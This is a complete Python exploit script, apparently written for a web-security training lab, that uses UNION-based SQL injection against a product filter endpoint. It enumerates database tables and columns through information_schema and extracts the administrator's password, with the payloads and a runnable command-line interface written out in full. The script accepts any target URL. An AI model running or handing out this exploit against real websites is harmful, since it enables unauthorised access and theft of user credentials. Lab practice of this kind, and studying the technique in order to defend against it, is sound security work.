# Import necessary libraries
import requests  # For making HTTP requests
import sys       # For handling command-line arguments
import urllib3   # For disabling SSL warnings
from bs4 import BeautifulSoup  # For parsing HTML content
import re        # For regular expressions
import logging   # For logging messages to track script execution

# Disable SSL/TLS warnings (useful for labs, but avoid in production)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging to display messages with timestamps and severity levels
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define proxies to route traffic through a tool like Burp Suite for debugging
proxies = {
    'http': 'http://127.0.0.1:8080',  # Proxy for HTTP traffic
    'https': 'http://127.0.0.1:8080'  # Proxy for HTTPS traffic
}

# Define headers to make the HTTP request look like it's coming from a real browser
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Accept-Language': 'en-US,en;q=0.5'  # Specify preferred languages
}

# Function to perform an HTTP GET request with the SQL injection payload
def perform_request(url, sql_payload):
    """
    Sends a GET request to the target URL with the SQL injection payload.
    :param url: The base URL of the target website.
    :param sql_payload: The SQL injection payload to append to the request.
    :return: The HTML content of the response if successful, otherwise None.
    """
    path = '/filter?category=Accessories'  # The vulnerable endpoint
    try:
        # Send the GET request with the payload, ignoring SSL verification
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies, headers=headers)
        r.raise_for_status()  # Raise an exception if the request fails (e.g., 404, 500)
        return r.text  # Return the HTML content of the response
    except requests.exceptions.RequestException as e:
        # Log any errors that occur during the request
        logging.error(f"Request failed: {e}")
        return None

# Function to find the name of the users table using SQL injection
def sqli_users_table(url):
    """
    Exploits SQL injection to find the name of the users table in the database.
    :param url: The base URL of the target website.
    :return: The name of the users table if found, otherwise False.
    """
    # SQL payload to retrieve table names from the information_schema
    sql_payload = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
    res = perform_request(url, sql_payload)  # Send the request
    if not res:
        return False  # Exit if the request failed
    # Parse the HTML response using BeautifulSoup
    soup = BeautifulSoup(res, 'html.parser')
    # Search for a table name containing 'users' (case-insensitive)
    users_table = soup.find(text=re.compile('.*users.*', re.IGNORECASE))
    return users_table if users_table else False  # Return the table name or False if not found

# Function to find the username and password columns in the users table
def sqli_users_columns(url, users_table):
    """
    Exploits SQL injection to find the username and password columns in the users table.
    :param url: The base URL of the target website.
    :param users_table: The name of the users table.
    :return: A tuple containing the username and password column names if found, otherwise (None, None).
    """
    # SQL payload to retrieve column names for the users table
    sql_payload = f"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '{users_table}'--"
    res = perform_request(url, sql_payload)  # Send the request
    if not res:
        return None, None  # Exit if the request failed
    # Parse the HTML response using BeautifulSoup
    soup = BeautifulSoup(res, 'html.parser')
    # Search for columns named 'username' and 'password' (case-insensitive)
    username_column = soup.find(text=re.compile('.*username.*', re.IGNORECASE))
    password_column = soup.find(text=re.compile('.*password.*', re.IGNORECASE))
    return username_column, password_column  # Return the column names

# Function to extract the administrator's password from the users table
def sqli_administrator_cred(url, users_table, username_column, password_column):
    """
    Exploits SQL injection to retrieve the administrator's password from the users table.
    :param url: The base URL of the target website.
    :param users_table: The name of the users table.
    :param username_column: The name of the username column.
    :param password_column: The name of the password column.
    :return: The administrator's password if found, otherwise None.
    """
    # SQL payload to retrieve the administrator's username and password
    sql_payload = f"' UNION SELECT {username_column}, {password_column} FROM {users_table}--"
    res = perform_request(url, sql_payload)  # Send the request
    if not res:
        return None  # Exit if the request failed
    # Parse the HTML response using BeautifulSoup
    soup = BeautifulSoup(res, 'html.parser')
    # Locate the administrator's password in the HTML structure
    admin_password = soup.body.find(text="administrator").parent.findNext('td').contents[0]
    return admin_password  # Return the password

# Main execution block
if __name__ == "__main__":
    # Check if the user provided a URL as a command-line argument
    if len(sys.argv) != 2:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f"[-] Example: {sys.argv[0]} http://www.example.com")
        sys.exit(-1)  # Exit with an error code if the argument is missing

    # Extract the target URL from the command-line argument
    url = sys.argv[1].strip()
    logging.info("Looking for a users table...")
    # Step 1: Find the users table
    users_table = sqli_users_table(url)
    if users_table:
        logging.info(f"Found the users table name: {users_table}")
        # Step 2: Find the username and password columns
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            logging.info(f"Found the username column name: {username_column}")
            logging.info(f"Found the password column name: {password_column}")
            # Step 3: Retrieve the administrator's password
            admin_password = sqli_administrator_cred(url, users_table, username_column, password_column)
            if admin_password:
                logging.info(f"[+] The administrator password is: {admin_password}")
            else:
                logging.error("[-] Did not find the administrator password.")
        else:
            logging.error("Did not find the username and/or the password columns.")
    else:
        logging.error("Did not find a users table.")
